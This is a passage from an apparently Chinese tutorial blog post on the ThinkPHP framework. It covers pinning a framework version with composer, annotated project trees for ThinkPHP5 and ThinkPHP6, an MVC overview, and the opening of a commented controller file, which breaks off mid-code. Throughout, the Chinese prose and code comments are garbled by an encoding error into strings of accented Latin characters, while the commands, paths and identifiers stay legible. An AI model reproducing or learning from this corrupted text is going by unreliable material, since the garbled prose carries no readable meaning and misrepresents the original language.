<p>æ‰€ä»¥å®é™…å®‰è£…çš„æ˜¯æœ€æ–°çš„ <strong>5.0.x</strong>ï¼Œä¹Ÿå°±æ˜¯ <code>topthink/framework@5.0.25</code>ã€‚</p>
<p>å¦‚æœæˆ‘ä»¬æƒ³å°† <code>topthink/framework</code> é™çº§åˆ°æŒ‡å®šç‰ˆæœ¬éœ€è¦è¿è¡Œä¸‹é¢è¿™æ¡å‘½ä»¤ï¼š</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require topthink/framework=5.0.23</span><br></pre></td></tr></table></figure></div>

<p>è¿™æ¡å‘½ä»¤ä¼šå°†æ¡†æ¶é™çº§åˆ° <strong>5.0.23</strong>ï¼Œé€‚ç”¨äºåœ¨ <code>5.0.*</code> è¿™ä¸ªå°ç‰ˆæœ¬èŒƒå›´å†…è‡ªç”±åˆ‡æ¢ç‰ˆæœ¬ï¼ˆå¦‚ 5.0.22ã€5.0.25 ç­‰ï¼‰ï¼Œä¾¿äºæµ‹è¯•å†å²è¡Œä¸ºæˆ–æ¼æ´éªŒè¯ã€‚</p>
<h2 id="é¡¹ç›®ç»“æ„"><a href="#é¡¹ç›®ç»“æ„" class="headerlink" title="é¡¹ç›®ç»“æ„"></a>é¡¹ç›®ç»“æ„</h2><h3 id="ThinkPHP5"><a href="#ThinkPHP5" class="headerlink" title="ThinkPHP5"></a>ThinkPHP5</h3><p>ä¸€ä¸ªåŸºäº ThinkPHP5 çš„å…¸å‹ Web é¡¹ç›®å¦‚ä¸‹:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">tp5-test/                 â† â˜… æ•´ä¸ªé¡¹ç›®æ ¹ç›®å½•</span><br><span class="line">â”œâ”€â”€ application/          â† â˜… ä¸šåŠ¡ä»£ç æ ¹ç›®å½•ï¼ˆMVC ä¸é…ç½®ï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ index/                â† é»˜è®¤æ¨¡å—ï¼ˆmoduleï¼‰</span><br><span class="line">â”‚   â”‚   â””â”€â”€ controller/</span><br><span class="line">â”‚   â”‚       â””â”€â”€ Index.php     â† ç¤ºä¾‹æ§åˆ¶å™¨ï¼ˆé»˜è®¤é¦–é¡µï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ common.php            â† å…¬å…±å‡½æ•°ï¼ˆç³»ç»Ÿè‡ªåŠ¨åŠ è½½ï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ command.php           â† CLI è‡ªå®šä¹‰å‘½ä»¤æ³¨å†Œ</span><br><span class="line">â”‚   â”œâ”€â”€ config.php            â† åº”ç”¨çº§é…ç½®ï¼ˆå¯è¦†ç›–æ¡†æ¶é»˜è®¤é…ç½®ï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ database.php          â† æ•°æ®åº“è¿æ¥é…ç½®</span><br><span class="line">â”‚   â”œâ”€â”€ route.php             â† è·¯ç”±è§„åˆ™ï¼ˆé—­åŒ…æˆ–é™æ€è·¯ç”±ï¼‰</span><br><span class="line">â”‚   â””â”€â”€ tags.php              â† äº‹ä»¶ / æ ‡ç­¾æ‰©å±•</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€â”€ public/               â† â˜… Web æœåŠ¡å™¨æ ¹ç›®å½•ï¼ˆéƒ¨ç½²æ—¶ä»…æš´éœ²æ­¤å±‚ï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ index.php             â† é¡¹ç›®å…¥å£æ–‡ä»¶ï¼ˆæ‰€æœ‰ HTTP è¯·æ±‚ä»è¿™é‡Œè¿›å…¥ï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ router.php            â† PHP å†…ç½®æœåŠ¡å™¨è·¯ç”±è„šæœ¬ï¼ˆå¼€å‘ç”¨ï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ favicon.ico</span><br><span class="line">â”‚   â”œâ”€â”€ robots.txt</span><br><span class="line">â”‚   â””â”€â”€ static/               â† å‰ç«¯é™æ€èµ„æºï¼ˆJS / CSS / å›¾ç‰‡ï¼‰</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€â”€ thinkphp/             â† â˜… æ¡†æ¶æ ¸å¿ƒæºç ï¼ˆä¸è¦ä¿®æ”¹ï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ start.php             â† æ¡†æ¶å¯åŠ¨å™¨ï¼Œå…¥å£æ–‡ä»¶æœ€ç»ˆ require è¿™é‡Œ</span><br><span class="line">â”‚   â”œâ”€â”€ base.php / helper.php â† å¸¸é‡ &amp; å…¨å±€åŠ©æ‰‹å‡½æ•°ï¼ˆå¦‚ dump()ï¼‰</span><br><span class="line">â”‚   â””â”€â”€ library/think/â€¦       â† Appã€Routeã€Model ç­‰æ‰€æœ‰æ ¸å¿ƒç±»</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€â”€ vendor/               â† â˜… Composer ä¾èµ–ç›®å½•</span><br><span class="line">â”‚   â”œâ”€â”€ autoload.php          â† Composer è‡ªåŠ¨åŠ è½½å…¥å£</span><br><span class="line">â”‚   â”œâ”€â”€ composer/             â† Composer è¿è¡ŒæœŸæ–‡ä»¶</span><br><span class="line">â”‚   â””â”€â”€ topthink/think-installer/  â† ThinkPHP ä¸“ç”¨å®‰è£…æ’ä»¶ï¼ˆç”Ÿæˆé»˜è®¤ç»“æ„ï¼‰</span><br><span class="line">â”‚       â””â”€â”€ â€¦                  â† æ’ä»¶æºç ï¼Œä¸éœ€æ‰‹åŠ¨ä¿®æ”¹</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€â”€ extend/               â† ç¬¬ä¸‰æ–¹æˆ–è‡ªå®šä¹‰æ‰©å±•åº“ï¼ˆå¯é€‰ï¼Œè‡ªå®šä¹‰åŠ è½½ï¼‰</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€â”€ runtime/              â† è¿è¡Œæ—¶ç”Ÿæˆï¼šæ—¥å¿—ã€ç¼“å­˜ã€æ¨¡æ¿ç¼–è¯‘ç­‰</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€â”€ composer.json         â† â˜… ä¾èµ–å£°æ˜ä¸è‡ªåŠ¨åŠ è½½è§„åˆ™</span><br><span class="line">â”œâ”€â”€ composer.lock         â† é”å®šå®é™…å®‰è£…ç‰ˆæœ¬ï¼ˆä¿è¯ç¯å¢ƒä¸€è‡´ï¼‰</span><br><span class="line">â”œâ”€â”€ think                 â† å‘½ä»¤è¡Œå…¥å£è„šæœ¬ï¼ˆå¦‚ `php think run`ï¼‰</span><br><span class="line">â”œâ”€â”€ build.php             â† å¯é€‰ï¼šå¿«é€Ÿç”Ÿæˆæ¨¡å—ç›®å½•çš„è„šæœ¬</span><br><span class="line">â”œâ”€â”€ CHANGELOG.md          â† æ¡†æ¶æ›´æ–°æ—¥å¿—</span><br><span class="line">â”œâ”€â”€ LICENSE.txt           â† å¼€æºè®¸å¯è¯</span><br><span class="line">â””â”€â”€ README.md             â† é¡¹ç›®/æ¡†æ¶ä½¿ç”¨è¯´æ˜</span><br></pre></td></tr></table></figure></div>

<h3 id="ThinkPHP6"><a href="#ThinkPHP6" class="headerlink" title="ThinkPHP6"></a>ThinkPHP6</h3><p>ThinkPHP 6 ç›¸æ¯” ThinkPHP 5 é¡¹ç›®ç»“æ„åšäº†ä¸å°‘ <strong>ç²¾ç®€ä¸ç°ä»£åŒ–</strong> çš„è°ƒæ•´ã€‚ä¸€ä¸ªåŸºäº ThinkPHP6 çš„å…¸å‹ Web é¡¹ç›®å¦‚ä¸‹:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">tp6-test/                 â† â˜… æ•´ä¸ªé¡¹ç›®æ ¹ç›®å½•</span><br><span class="line">â”œâ”€â”€ app/                  â† â˜… åº”ç”¨ä»£ç ç›®å½•ï¼ˆä½ å†™çš„ä¸šåŠ¡é€»è¾‘ï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ controller/           â†   æ§åˆ¶å™¨ç›®å½• (C)ï¼ŒURL è·¯ç”±é»˜è®¤æŒ‡å‘è¿™é‡Œ</span><br><span class="line">â”‚   â”‚   â””â”€â”€ Index.php         â†     ç¤ºä¾‹æ§åˆ¶å™¨ï¼Œé»˜è®¤è®¿é—® `/` ä¼šèµ°è¿™é‡Œ</span><br><span class="line">â”‚   â”œâ”€â”€ AppService.php        â†   åº”ç”¨æœåŠ¡ç±»ï¼Œå¯æ³¨å†ŒæœåŠ¡ç»‘å®š</span><br><span class="line">â”‚   â”œâ”€â”€ BaseController.php    â†   æ§åˆ¶å™¨åŸºç±»ï¼ˆå®šä¹‰é€šç”¨é€»è¾‘ï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ ExceptionHandle.php   â†   å…¨å±€å¼‚å¸¸å¤„ç†ç±»</span><br><span class="line">â”‚   â”œâ”€â”€ Request.php           â†   è‡ªå®šä¹‰è¯·æ±‚ç±»ï¼ˆå¯æ‰©å±•ï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ common.php            â†   åº”ç”¨å…¬å…±å‡½æ•°ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨åŠ è½½</span><br><span class="line">â”‚   â”œâ”€â”€ event.php             â†   åº”ç”¨äº‹ä»¶å®šä¹‰ï¼ˆäº‹ä»¶/ç›‘å¬å™¨ç»‘å®šï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ middleware.php        â†   ä¸­é—´ä»¶æ³¨å†Œè¡¨</span><br><span class="line">â”‚   â”œâ”€â”€ provider.php          â†   æœåŠ¡æä¾›è€…æ³¨å†Œ</span><br><span class="line">â”‚   â””â”€â”€ service.php           â†   å®¹å™¨æœåŠ¡ç»‘å®š</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€â”€ public/               â† â˜… Web æœåŠ¡å™¨æ ¹ç›®å½•ï¼ˆéƒ¨ç½²æ—¶åªæš´éœ²è¿™ä¸€å±‚ï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ index.php             â†   åº”ç”¨å…¥å£æ–‡ä»¶ï¼Œæ‰€æœ‰ HTTP è¯·æ±‚ä»è¿™é‡Œè¿›æ¥</span><br><span class="line">â”‚   â”œâ”€â”€ favicon.ico           â†   ç½‘é¡µå°å›¾æ ‡</span><br><span class="line">â”‚   â”œâ”€â”€ robots.txt            â†   æœç´¢å¼•æ“çˆ¬è™«æ§åˆ¶æ–‡ä»¶</span><br><span class="line">â”‚   â”œâ”€â”€ router.php            â†   å†…ç½®æœåŠ¡å™¨æ—¶ç”¨äºæ¨¡æ‹Ÿè·¯ç”±ï¼ˆå¼€å‘ç”¨ï¼‰</span><br><span class="line">â”‚   â””â”€â”€ static/               â†   é™æ€èµ„æºç›®å½•ï¼ˆJS/CSS/å›¾ç‰‡ç­‰ï¼‰</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€â”€ config/               â† â˜… åº”ç”¨é…ç½®ç›®å½•ï¼ˆé›†ä¸­ç®¡ç†ï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ app.php               â†   åº”ç”¨åŸºæœ¬è®¾ç½®</span><br><span class="line">â”‚   â”œâ”€â”€ cache.php             â†   ç¼“å­˜è®¾ç½®</span><br><span class="line">â”‚   â”œâ”€â”€ console.php           â†   CLI å‘½ä»¤è®¾ç½®</span><br><span class="line">â”‚   â”œâ”€â”€ cookie.php            â†   Cookie é…ç½®</span><br><span class="line">â”‚   â”œâ”€â”€ database.php          â†   æ•°æ®åº“è¿æ¥è®¾ç½®</span><br><span class="line">â”‚   â”œâ”€â”€ filesystem.php        â†   æœ¬åœ°/äº‘å­˜å‚¨è®¾ç½®</span><br><span class="line">â”‚   â”œâ”€â”€ lang.php              â†   å¤šè¯­è¨€é…ç½®</span><br><span class="line">â”‚   â”œâ”€â”€ log.php               â†   æ—¥å¿—é€šé“è®¾ç½®</span><br><span class="line">â”‚   â”œâ”€â”€ middleware.php        â†   å…¨å±€ä¸­é—´ä»¶é…ç½®</span><br><span class="line">â”‚   â”œâ”€â”€ route.php             â†   è·¯ç”±é…ç½®</span><br><span class="line">â”‚   â”œâ”€â”€ session.php           â†   ä¼šè¯ Session è®¾ç½®</span><br><span class="line">â”‚   â”œâ”€â”€ trace.php             â†   Trace è°ƒè¯•é…ç½®</span><br><span class="line">â”‚   â””â”€â”€ view.php              â†   æ¨¡æ¿æ¸²æŸ“è®¾ç½®</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€â”€ route/                â† è·¯ç”±å®šä¹‰ï¼ˆæ¨èå†™åœ¨è¿™é‡Œè€Œéä»£ç é‡Œï¼‰</span><br><span class="line">â”‚   â””â”€â”€ app.php               â†   é»˜è®¤è·¯ç”±å®šä¹‰æ–‡ä»¶ï¼ˆæ”¯æŒé—­åŒ…/æ§åˆ¶å™¨æ˜ å°„ç­‰ï¼‰</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€â”€ runtime/              â† è¿è¡ŒæœŸæ–‡ä»¶ï¼ˆç¼“å­˜ã€æ—¥å¿—ã€ç¼–è¯‘æ¨¡æ¿ç­‰è‡ªåŠ¨ç”Ÿæˆï¼‰</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€â”€ extend/               â† è‡ªå®šä¹‰æ‰©å±•ç±»ç›®å½•ï¼ˆå¯ç±»æ¯” â€œlib/â€ï¼‰</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€â”€ vendor/               â† â˜… Composer å®‰è£…çš„ä¾èµ–ç›®å½•ï¼ˆå« thinkphp æ¡†æ¶æœ¬ä½“ï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ topthink/             â†   ThinkPHP æ¡†æ¶æ ¸å¿ƒæºç ï¼ˆthink-ormã€framework ç­‰ï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ symfony/              â†   Symfony çš„ç»„ä»¶ï¼ˆå¦‚ var-dumperï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ psr/                  â†   PSR è§„èŒƒæ¥å£ï¼ˆLogger, Container ç­‰ï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ autoload.php          â†   è‡ªåŠ¨åŠ è½½å…¥å£</span><br><span class="line">â”‚   â””â”€â”€ ...                   â†   å…¶ä»–åº“ï¼ˆç”± composer å®‰è£…ç”Ÿæˆï¼‰</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€â”€ think                 â† ThinkPHP å‘½ä»¤è¡Œå·¥å…·ï¼ˆç”¨äº `php think`ï¼‰</span><br><span class="line">â”‚</span><br><span class="line">â”œâ”€â”€ composer.json         â† â˜… é¡¹ç›®ä¾èµ–å£°æ˜æ–‡ä»¶ï¼Œæ‰§è¡Œ `composer install` ä½¿ç”¨</span><br><span class="line">â”œâ”€â”€ composer.lock         â†   é”å®šä¾èµ–çš„å…·ä½“ç‰ˆæœ¬ï¼ˆä¿è¯ç¯å¢ƒä¸€è‡´ï¼‰</span><br><span class="line">â”œâ”€â”€ LICENSE.txt           â† é¡¹ç›®å¼€æºè®¸å¯è¯</span><br><span class="line">â””â”€â”€ README.md             â† é¡¹ç›®è¯´æ˜æ–‡æ¡£</span><br></pre></td></tr></table></figure></div>

<p>ä¸»è¦çš„å˜åŒ–æœ‰ï¼š</p>
<ul>
<li><strong>åº”ç”¨ç»“æ„å˜åŒ–ï¼š</strong><ul>
<li><strong>TP5 é»˜è®¤å¯ç”¨å¤šæ¨¡å—ï¼ˆæ¨¡å— &#x3D; å­åº”ç”¨ï¼‰</strong>ï¼Œæ¯ä¸ªæ¨¡å—æ˜¯ä¸€ä¸ª MVC å•å…ƒï¼Œä½äº <code>application/æ¨¡å—å/</code> ä¸‹ï¼ˆå¦‚ <code>index/</code>ã€<code>admin/</code>ï¼‰ã€‚</li>
<li><strong>TP6&#x2F;TP8 é»˜è®¤æ˜¯å•ä¸€åº”ç”¨ç»“æ„</strong>ï¼Œæ‰€æœ‰æ§åˆ¶å™¨ã€æ¨¡å‹ç­‰æ”¾åœ¨ <code>app/</code> ç›®å½•ä¸‹ã€‚å¦‚æœéœ€è¦å¤šæ¨¡å—ï¼ˆå¤šåº”ç”¨æ¨¡å¼ï¼‰ï¼Œ<strong>éœ€è¦æ‰‹åŠ¨åœ¨é…ç½®ä¸­å¯ç”¨</strong>ï¼ˆ<code>app.multi_app = true</code>ï¼‰ï¼Œå¹¶æ‰‹åŠ¨åˆ›å»ºå­ç›®å½•å¦‚ <code>app/index/</code>ã€<code>app/admin/</code>ã€‚</li>
</ul>
</li>
<li><strong>æ¡†æ¶æºç ä½ç½®å˜åŒ–ï¼š</strong><ul>
<li><strong>TP5 çš„æ¡†æ¶æºç åœ¨ <code>thinkphp/</code> ç›®å½•</strong>ï¼Œæ˜¯é¡¹ç›®ç»“æ„çš„ä¸€éƒ¨åˆ†ã€‚</li>
<li><strong>TP6&#x2F;TP8 çš„æ¡†æ¶æ ¸å¿ƒè¢«å®Œå…¨ Composer åŒ–</strong>ï¼Œæºç ä½äº <code>vendor/topthink/framework/src/think/</code> ä¸­ã€‚<br>è¿™ç¬¦åˆç°ä»£ Composer åŒ…ç®¡ç†è§„èŒƒï¼Œ**<code>thinkphp/</code> ç›®å½•ä¸å†å­˜åœ¨**ã€‚</li>
</ul>
</li>
<li><strong>é…ç½®æ–‡ä»¶ç»„ç»‡å˜åŒ–ï¼š</strong><ul>
<li><strong>TP5 çš„é…ç½®åˆ†å¸ƒåœ¨ <code>application/</code> æ ¹ä¸‹å¤šä¸ªæ–‡ä»¶ä¸­</strong>ï¼ˆå¦‚ <code>config.php</code>ã€<code>database.php</code>ï¼‰ã€‚</li>
<li><strong>TP6&#x2F;TP8 æŠŠæ‰€æœ‰é…ç½®ç»Ÿä¸€é›†ä¸­åˆ° <code>config/</code> ç›®å½•ä¸­</strong>ï¼ŒæŒ‰åŠŸèƒ½æ‹†åˆ†å¤šä¸ªæ–‡ä»¶ï¼ˆå¦‚ <code>config/app.php</code>ã€<code>config/database.php</code>ã€<code>config/session.php</code>ï¼‰ã€‚é…ç½®åŠ è½½æ–¹å¼ä¹Ÿæ›´åŠ æ ‡å‡†åŒ–å’Œå¯æ‰©å±•ã€‚</li>
</ul>
</li>
</ul>
<h2 id="æ¡†æ¶ä½¿ç”¨"><a href="#æ¡†æ¶ä½¿ç”¨" class="headerlink" title="æ¡†æ¶ä½¿ç”¨"></a>æ¡†æ¶ä½¿ç”¨</h2><p>ThinkPHP æ˜¯ä¸€ä¸ªåŸºäº<strong>å¤šæ¨¡å— + MVC æ¶æ„</strong>æ¨¡å¼çš„ PHP æ¡†æ¶ï¼Œå¼ºè°ƒç»“æ„åˆ†ç¦»ã€è·¯ç”±æ˜ å°„å’Œå¿«é€Ÿå¼€å‘ã€‚</p>
<p>å®˜æ–¹æ–‡æ¡£ï¼š</p>
<ul>
<li><p><strong>ThinkPHP 5.0 æ–‡æ¡£</strong><br>ğŸ‘‰ <a class="link"   target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp5/118003" >https://www.kancloud.cn/manual/thinkphp5/118003<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p><strong>ThinkPHP 5.1 æ–‡æ¡£</strong><br>ğŸ‘‰ <a class="link"   target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp5_1/353946" >https://www.kancloud.cn/manual/thinkphp5_1/353946<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p><strong>ThinkPHP 6.0 æ–‡æ¡£</strong><br>ğŸ‘‰ <a class="link"   target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp6_0/1037479" >https://www.kancloud.cn/manual/thinkphp6_0/1037479<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
</ul>
<h3 id="MVC-æ¶æ„"><a href="#MVC-æ¶æ„" class="headerlink" title="MVC æ¶æ„"></a>MVC æ¶æ„</h3><p><strong>MVC æ¶æ„</strong>æ˜¯ ThinkPHP çš„åŸºç¡€æ¶æ„è®¾è®¡ï¼Œå¼ºè°ƒ<strong>èŒè´£åˆ†ç¦»ã€è§£è€¦åˆã€ååŒå¼€å‘</strong>ã€‚å…·ä½“ä½“ç°åœ¨ <code>application</code> ç›®å½•ä¸‹ã€‚é€šå¸¸ï¼Œ<code>application</code> ç›®å½•ä¸‹çš„åŒä¸€ä¸ªæ¨¡å—ä¼šåˆ†ä¸º <code>model</code>ã€<code>view</code>ã€<code>controller</code> ä¸‰ä¸ªç›®å½•ï¼Œåˆ†åˆ«å¯¹åº” MVC æ¶æ„çš„ä¸‰ä¸ªç»„æˆéƒ¨åˆ†ã€‚åœ¨è¿™ä¸€æ¶æ„ä¸­ï¼Œæ§åˆ¶å™¨ä¸ä»…ä»…æ˜¯â€œä¸­ä»‹è€…â€ï¼Œå®ƒè¿˜è´Ÿè´£æ¥æ”¶ç”¨æˆ·è¯·æ±‚ã€éªŒè¯æ•°æ®ã€è°ƒåº¦ä¸šåŠ¡é€»è¾‘ã€å†³å®šå±•ç¤ºè§†å›¾ã€‚</p>
<table>
<thead>
<tr>
<th>ç»„æˆ</th>
<th>ä½ç½®ï¼ˆé»˜è®¤ï¼‰</th>
<th>ä½œç”¨è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>Model</td>
<td><code>application/[æ¨¡å—]/model/</code></td>
<td>æ•°æ®æ“ä½œå±‚ï¼ˆæ•°æ®åº“ CURDã€é€»è¾‘å°è£…ï¼‰</td>
</tr>
<tr>
<td>View</td>
<td><code>application/[æ¨¡å—]/view/</code></td>
<td>é¡µé¢å±•ç¤ºå±‚ï¼ˆHTMLæ¨¡æ¿ã€æ ‡ç­¾ï¼‰</td>
</tr>
<tr>
<td>Controller</td>
<td><code>application/[æ¨¡å—]/controller/</code></td>
<td>ä¸šåŠ¡æ§åˆ¶å±‚ï¼ˆè¯·æ±‚å¤„ç†ã€ä¸šåŠ¡è°ƒåº¦ï¼‰</td>
</tr>
</tbody></table>
<p>ä¾‹å¦‚å¯¹äº <code>index</code> æ¨¡å—ï¼Œç›®å½•ç»“æ„å¦‚ä¸‹ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">application/</span><br><span class="line">â”œâ”€â”€ index/           â† é»˜è®¤æ¨¡å—</span><br><span class="line">â”‚   â”œâ”€â”€ controller/  â† æ§åˆ¶å™¨</span><br><span class="line">â”‚   â”œâ”€â”€ model/       â† æ¨¡å‹ï¼ˆå¯é€‰ï¼‰</span><br><span class="line">â”‚   â”œâ”€â”€ view/        â† è§†å›¾</span><br><span class="line">â”œâ”€â”€ common.php       â† å…¬å…±å‡½æ•°æ–‡ä»¶</span><br><span class="line">â”œâ”€â”€ route.php        â† è·¯ç”±å®šä¹‰ï¼ˆå¯é€‰ï¼‰</span><br></pre></td></tr></table></figure></div>

<h4 id="Controllerï¼šæ§åˆ¶å™¨å±‚ï¼ˆä¸šåŠ¡æµç¨‹æ§åˆ¶ï¼‰"><a href="#Controllerï¼šæ§åˆ¶å™¨å±‚ï¼ˆä¸šåŠ¡æµç¨‹æ§åˆ¶ï¼‰" class="headerlink" title="Controllerï¼šæ§åˆ¶å™¨å±‚ï¼ˆä¸šåŠ¡æµç¨‹æ§åˆ¶ï¼‰"></a>Controllerï¼šæ§åˆ¶å™¨å±‚ï¼ˆä¸šåŠ¡æµç¨‹æ§åˆ¶ï¼‰</h4><p><strong>æ§åˆ¶å™¨å±‚</strong>è´Ÿè´£æ¥æ”¶è¯·æ±‚ï¼ˆå‚æ•°ï¼‰ï¼ŒéªŒè¯å‚æ•°ï¼Œè°ƒç”¨ä¸šåŠ¡é€»è¾‘ï¼ˆæ¨¡å‹ï¼‰å¹¶æœ€ç»ˆå†³å®šæ¸²æŸ“å“ªä¸€ä¸ªè§†å›¾ï¼Œæˆ–è¿”å› JSON å“åº”ã€‚</p>
<p>ä¾‹å¦‚ <code>application/index/controller/User.php</code>ï¼š</p>
<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// è®¾ç½®å½“å‰ç±»çš„å‘½åç©ºé—´ï¼Œå¯¹åº”ç›®å½•ç»“æ„ï¼šapplication/index/controller/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">application</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¼•å…¥ ThinkPHP çš„æ§åˆ¶å™¨åŸºç±»ï¼Œæä¾›æ¨¡æ¿æ¸²æŸ“ã€è·³è½¬æç¤ºç­‰åŠŸèƒ½</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¼•å…¥æ¨¡å‹ç±» Userï¼Œä½äº application/index/model/User.php</span></span><br><span class="line"><span class="comment">// æ³¨æ„æ­¤å¤„çš„ User æ˜¯æ¨¡å‹ç±»ï¼Œä¸æ˜¯å½“å‰æ§åˆ¶å™¨æœ¬èº«</span></span><br><span class="line"><span class="keyword">use</span> <span class="title">application</span>\<span class="title">index</span>\<span class="title">model</span>\<span class="title">User</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// ===================== ç”¨æˆ·åˆ—è¡¨ 